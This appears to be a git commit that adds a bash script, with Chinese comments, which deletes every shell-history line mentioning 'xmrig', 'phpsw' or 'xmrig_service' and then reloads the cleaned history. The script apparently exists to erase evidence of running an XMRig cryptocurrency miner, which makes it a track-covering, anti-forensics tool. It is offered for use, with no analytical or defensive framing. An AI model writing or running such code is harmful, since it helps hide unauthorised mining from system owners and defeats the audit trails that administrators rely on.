3f077046bd5ab9523c29ba3475758ba5478dc382
Frank <103011111+FrankDj90xxx@users.noreply.github.com>
2025-08-19 08:19:27 +0800

    Create clen_keywords.sh

---
+++ clen_keywords.sh
@@ -0,0 +1,23 @@
+#!/bin/bash
+# 删除 history 中包含敏感关键词的命令
+
+HISTFILE=${HISTFILE:-$HOME/.bash_history}
+BACKUP_FILE="$HISTFILE.bak"
+
+# 写入最新记录
+history -w
+
+
+
+# 关键字，可根据需要修改
+KEYWORDS="xmrig|phpsw|xmrig_service"
+
+# 删除包含关键词的命令
+grep -v -E "$KEYWORDS" "$HISTFILE" > "${HISTFILE}.new"
+mv "${HISTFILE}.new" "$HISTFILE"
+
+# 清空内存并重新加载
+history -c
+history -r
+
+echo "已删除包含 [$KEYWORDS] 的命令。"
